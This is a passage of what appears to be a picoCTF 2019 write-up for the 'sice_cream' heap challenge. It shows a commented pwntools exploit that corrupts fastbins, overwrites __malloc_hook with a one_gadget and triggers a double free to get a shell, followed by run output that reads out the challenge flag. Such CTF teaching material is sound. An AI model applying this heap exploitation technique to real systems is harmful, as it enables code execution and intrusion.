<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf02a4</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'main arena: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__malloc_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'one_gadget: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

<span class="s">'''
Same as the other exploit, except this time we overwrite the top chunk pointer
to the address of `__malloc_hook - 0x15`. We then request a chunk such that
it is serviced by the top chunk.

Then, just overwrite `__malloc_hook` with our working one gadget, and cause
a double free error. The double free error will call these functions in order:

free -&gt; __libc_free -&gt; _int_free -&gt; malloc_printerr -&gt; __libc_message
-&gt; backtrace_and_maps -&gt; init -&gt; dlerror_run -&gt; _dl_catch_error
-&gt; _dl_open -&gt; _dl_catch_error -&gt; dl_open_worker -&gt; _dl_map_object
-&gt; _dl_load_cache_lookup -&gt; __strdup

__strdup will use malloc to do its string duplication
'''</span>

<span class="c1"># We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">9</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
<span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 7
</span>
<span class="c1"># We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># Prepare for the fastbin attack: free a 0x61 sized chunk
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># This is the address where the 0x602040 address from above looks 16 byte aligned
</span><span class="n">fake_chunk_top</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0x6</span>

<span class="c1"># We set our fake chunk's fd pointer to point to our fake chunk in main arena
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_top</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="c1"># Chunk 9 will be in main arena, we overwrite the top chunk ptr with malloc_hook-0x15
# If you look at that malloc_hook-0x25, it looks like the top chunk header
# So we set the top chunk pointer to that address (malloc_hook-0x15)
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 8
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x3e</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span> <span class="o">-</span> <span class="mh">0x15</span><span class="p">))</span>

<span class="c1"># Now overwrite with one gadget
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">5</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>

<span class="c1"># Do a double free, this will end up calling malloc.
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream<span class="nv">$ </span>./exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/sice_cream'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
    RUNPATH:  <span class="s1">'./'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/libc.so.6'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+] Opening connection to 2019shell1.picoctf.com on port 38495: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak: 0x7f61ebcbdb78
<span class="o">[</span><span class="k">*</span><span class="o">]</span> main arena: 0x7f61ebcbdb20
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f61eb8f9000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f61eb93e390
<span class="o">[</span><span class="k">*</span><span class="o">]</span> __free_hook: 0x7f61ebcbf7a8
<span class="o">[</span><span class="k">*</span><span class="o">]</span> __malloc_hook: 0x7f61ebcbdb10
<span class="o">[</span><span class="k">*</span><span class="o">]</span> one_gadget: 0x7f61eb9e92a4
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="k">***</span> Error <span class="k">in</span> <span class="sb">`</span>/problems/sice-cream_4_7ef8903b2c31d9f08c4ad7bcdcb5f0d3/sice_cream<span class="s1">': double free or corruption (fasttop): 0x0000000001500010 ***
$ ls
flag.txt
ld-2.23.so
libc.so.6
sice_cream
xinet_startup.sh
$ cat flag.txt
flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_ac8fd349}$  
</span></code></pre></div></div>
:ET